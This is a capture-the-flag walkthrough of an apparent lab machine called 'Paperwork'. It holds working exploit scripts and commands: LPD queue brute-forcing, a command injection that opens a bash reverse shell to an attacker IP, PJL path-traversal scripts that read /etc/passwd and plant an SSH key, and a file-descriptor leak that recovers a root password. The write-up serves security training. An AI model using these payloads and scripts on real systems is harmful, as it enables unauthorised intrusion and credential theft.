# Paperwork

## Find open ports and services running on the target IP

Command:

```bash
nmap -sV -sC -T5 <target_ip>
```

The scan reveals SSH and an Nginx web server. Host configuration resolves `paperwork.htb`.

Add it to the `/etc/hosts` file.

Visiting the website revealed that it has something to do with a printing service.

The .zip file on the website contains the source code of the actual printing server (LPD) in use.

---

## Enumerate Valid LPD Queue Names

The LPD service (port 1515) requires a valid queue name before it will process a job. Queue names are brute-forced by checking the single-byte accept/reject response.

```bash
python3 enum_queues.py
```

Script:

```python
#!/usr/bin/env python3
import socket
HOST = "<target_ip>"
PORT = 1515
WORDLIST = "/path/to/custom_wordlist/printer_queues.txt"
with open(WORDLIST, "r") as f:
    for line in f:
        queue = line.strip()
        if not queue:
            continue
        payload = b"\x02" + queue.encode()
        try:
            with socket.create_connection((HOST, PORT), timeout=3) as s:
                s.sendall(payload)
                try:
                    response = s.recv(1)
                except socket.timeout:
                    response = b""
                if response == b"\x00":
                    print(f"[+] ACCEPTED : {queue}")
                elif response == b"\x01":
                    print(f"[-] REJECTED : {queue}")
                elif response:
                    print(f"[?] {queue:<25} Response: {response.hex()}")
                else:
                    print(f"[ ] {queue:<25} No response")
        except Exception as e:
            print(f"[!] {queue:<25} Error: {e}")
```

Output:

```text
[+] ACCEPTED : archive
```

Valid queue identified: `archive`

---

## Exploit LPD Command Injection Vulnerability

The LPD service passes the client-supplied Job Name into a server-side shell command via `subprocess.Popen(..., shell=True)`, allowing remote command execution.

```python
import socket
import time
host = "<target_ip>"
port = 1515
LHOST = "<attacker_vpn_ip>"
LPORT = 8888
s = socket.create_connection((host, port))
s.settimeout(5)
# 1. Select queue (server sends NO ack on success — only on rejection)
s.sendall(b"\x02archive\n")
# 2. Send control file header
content = f"J' ; bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' ; echo '".encode()
header = (
    b"\x02 " +
    str(len(content)).encode() +
    b" cfA001localhost\n"
)
s.sendall(header)
print("Header ACK:", repr(s.recv(1)))
# 3. Send control file content
s.sendall(content)
# small delay so the terminator byte doesn't get slurped into content
# by the server's off-by-one recv(size - len(content) + 1) bug
time.sleep(0.3)
# 4. End file transfer
s.sendall(b"\x00")
try:
    print("Final response:", repr(s.recv(1024)))
except socket.timeout:
    print("No final response (server may have already executed / closed)")
s.close()
```

The custom script above was used to inject the reverse shell command through the Job Name field.

Start a Netcat listener:

```bash
nc -lvnp 8888
```

A reverse shell connection is received.

---

## Obtain Initial Shell as lp

Check the current user:

```bash
whoami
```

Output:

```text
lp
```

Upgrade the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Discover Internal Printer Service

Display listening sockets:

```bash
ss -tlnp | grep 9100
```

Output:

```text
LISTEN 0      100        127.0.0.1:9100      0.0.0.0:*
```

Internal printer service confirmed on port `9100`, bound to loopback.

Identify the owning service:

```bash
systemctl list-units --type=service --state=running
systemctl cat jetdirect.service
```

Output:

```ini
[Unit]
Description=jetdirect server
[Service]
Type=simple
User=archivist
WorkingDirectory=/home/archivist/printer/
ExecStart=/usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer
Restart=on-failure
```

Also visible in the same output: `paperwork.service` ("Paperwork Management Daemon"), the root-owned daemon relevant to privilege escalation.

---

## Analyze the PJL Service and Read Source

```bash
python3 pjlfileread.py "jetdirect.py"
```

The following function reveals the vulnerability:

```python
def _translate(self, path):
    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
    return os.path.normpath(os.path.join(self._root, clean))
```

`0:` and leading slashes are stripped, but `..` is never blocked, allowing directory traversal out of the printer's virtual filesystem root and arbitrary file read/write.

---

## Develop PJL File Read Script

Script (`pjlfileread.py`):

```python
import socket, sys

def pjl_read(path, host="127.0.0.1", port=9100):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((host, port))
    cmd = f'@PJL FSUPLOAD NAME="0:{path}"\n'
    s.sendall(cmd.encode())
    buf = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk: break
            buf += chunk
    except socket.timeout:
        pass
    s.close()
    if buf.startswith(b"@PJL"):
        nl = buf.find(b"\n")
        return buf[:nl].decode(errors="replace"), buf[nl+1:]
    return None, buf

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <traversal_path>")
        sys.exit(1)
    header, data = pjl_read(sys.argv[1])
    print(f"[{header}]")
    sys.stdout.buffer.write(data)
```

## Develop PJL File Write Script

Script (`pjlfilewrite.py`):

```python
import socket, sys

def pjl_write(path, data, host="127.0.0.1", port=9100):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((host, port))
    header = f'@PJL FSDOWNLOAD NAME="0:{path}" SIZE={len(data)}\n'
    s.sendall(header.encode() + data)
    try:
        resp = s.recv(4096)
        print(resp.decode(errors="replace"))
    except socket.timeout:
        print("TIMEOUT waiting for response")
    s.close()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <traversal_path> <local_file_to_upload>")
        sys.exit(1)
    with open(sys.argv[2], "rb") as f:
        data = f.read()
    pjl_write(sys.argv[1], data)
```

---

## Retrieve Local Users via Arbitrary File Read

```bash
python3 pjlfileread.py "../../../../../../etc/passwd"
```

Output confirms `archivist` (uid 1000, `/bin/bash`) as a local user account.

---

## Inject SSH Key

Generate a keypair on the attacker machine:

```bash
ssh-keygen -t ed25519 -f ~/.ssh/paperwork_archivist -N ""
```

Write the public key into the target user's `authorized_keys` via traversal:

```bash
python3 pjlfilewrite.py "../../../../../../home/archivist/.ssh/authorized_keys" ./mykey.pub
```

Output:

```text
OK
```

Verify the write:

```bash
python3 pjlfileread.py "../../../../../../home/archivist/.ssh/authorized_keys"
```

---

## Obtain Access as archivist via SSH

```bash
ssh -i ~/.ssh/paperwork_archivist -o PreferredAuthentications=publickey -o IdentitiesOnly=yes archivist@<target_ip>
```

Check the current user:

```bash
whoami
```

Output:

```text
archivist
```

SSH authentication as archivist is established without requiring a password.

---

## Retrieve User Flag

```bash
cat ~/user.txt
```

The user flag is obtained.

---

# Privilege Escalation

## Enumerate Root-Owned Processes

```bash
ps aux | grep paperwork
```

Output:

```text
root  1463  /usr/bin/python3 /usr/bin/paperwork-daemon
```

A root-owned Python daemon is identified: `paperwork-daemon`.

---

## Enumerate UNIX Sockets

```bash
ls -la /run/paperwork/
```

Output:

```text
srw-rw----  1 root archivist   0 Jul 24 05:20 mgmt.sock
```

A management socket accessible by the `archivist` group is discovered.

---

## Analyze the Daemon's Source Code

```bash
cat /usr/bin/paperwork-daemon
```

```python
#!/usr/bin/python3
import socket, os, array, hashlib
import zipfile
import shutil
try:
    admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)
except Exception:
    os._exit(1)
LOG_PATH = "/home/archivist/printer/logs/commands.log"
def get_admin_secret():
    data = os.pread(admin_fd, 1024, 0).decode().strip()
    if "ADMIN_PASSWORD=" in data:
        return data.split("ADMIN_PASSWORD=")[1].split("\n")[0]
    return data
def scan_for_malice():
    if not os.path.exists(LOG_PATH):
        return False
    with open(LOG_PATH, 'r') as f:
        content = f.read().upper()
        if any(trigger in content for trigger in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
            return True
    return False
def trigger_lockdown(conn):
    try:
        log_fd = os.open(LOG_PATH, os.O_RDONLY)
        evidence_bundle = array.array("i", [log_fd, admin_fd])
        msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
        conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
        zip_path = "/root/quarantine/evidence.zip"
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(LOG_PATH, arcname="commands.log")
        with open(LOG_PATH, 'w') as f:
            f.truncate(0)
        os.close(log_fd)
    except:
        pass
def main():
    socket_path = "/run/paperwork/mgmt.sock"
    if os.path.exists(socket_path): os.remove(socket_path)
    if not os.path.exists("/run/paperwork"): os.makedirs("/run/paperwork")
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.bind(socket_path)
    os.chmod(socket_path, 0o660)
    os.chown(socket_path, 0, 1000)
    s.listen(5)
    while True:
        conn, _ = s.accept()
        if scan_for_malice():
            trigger_lockdown(conn)
        else:
            secret = get_admin_secret()
            token = hashlib.sha256(f"SYSTEM_CLEAN:{secret}".encode()).hexdigest()
            conn.sendall(f"STATUS: SYSTEM_CLEAN\nSIGNATURE: {token}\n".encode())
        conn.close()
if __name__ == "__main__":
    main()
```

The daemon checks its own log file (`commands.log`, the same log
`jetdirect.py` writes to) for the strings `FSQUERY`, `FSUPLOAD`, or
`FSDOWNLOAD` on every connection. If found, it treats the connection as
a security incident and leaks two open file descriptors via
`SCM_RIGHTS`: one to the log file, and one to
`/etc/paperwork/admin_pins.conf` — a root-only file it opened for itself
at startup.

---

## Trigger the Log Flag

Any prior use of the PJL read/write scripts already writes matching
trigger strings into `commands.log`. Confirmed freshly with:

```bash
python3 pjlfileread.py "jetdirect.py"
```

---

## Develop the File Descriptor Leak Exploit

Script (`fdleak.py`):

```python
import socket, array, os

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.settimeout(5)
s.connect("/run/paperwork/mgmt.sock")
s.send(b"status\n")

fds = array.array("i")
msg, ancdata, flags, addr = s.recvmsg(4096, socket.CMSG_LEN(2 * fds.itemsize))

for cmsg_level, cmsg_type, cmsg_data in ancdata:
    if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
        fds.frombytes(cmsg_data[:len(cmsg_data) - (len(cmsg_data) % fds.itemsize)])

print("Message:", msg)
print("Received FDs:", list(fds))

if len(fds) >= 2:
    log_fd, admin_fd = fds[0], fds[1]
    admin_data = os.read(admin_fd, 1024)
    print("\n--- admin_pins.conf contents ---")
    print(admin_data.decode(errors="replace"))
```

`recvmsg()` with a `CMSG_LEN`-sized buffer is required to capture the
ancillary `SCM_RIGHTS` data — a plain `s.recv()` silently discards the
leaked file descriptors.

---

## Trigger the Daemon's Forensic Response and Recover Credentials

```bash
python3 fdleak.py
```

Output:

```text
Message: b'ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.'
Received FDs: [4, 5]

--- admin_pins.conf contents ---
ADMIN_PASSWORD=ApparelMortuaryCedar22
```

The administrator password is recovered via the leaked file descriptor.

---

## Escalate to Root

```bash
su root
```

Password: `ApparelMortuaryCedar22`

Verify privileges:

```bash
whoami
```

Output:

```text
root
```

---

## Retrieve Root Flag

```bash
cd /root
cat root.txt
```

The root flag is successfully obtained.

---

# Attack Chain

```text
LPD Queue Enumeration → LPD Command Injection → Shell as lp → Discover jetdirect.py (PJL, port 9100) → Path Traversal Read/Write → SSH Key Injection as archivist → User Flag → Enumerate paperwork-daemon → Locate mgmt.sock → Analyze Daemon Source → Trigger scan_for_malice() → SCM_RIGHTS File Descriptor Leak → Recover Admin Password → Root Access
```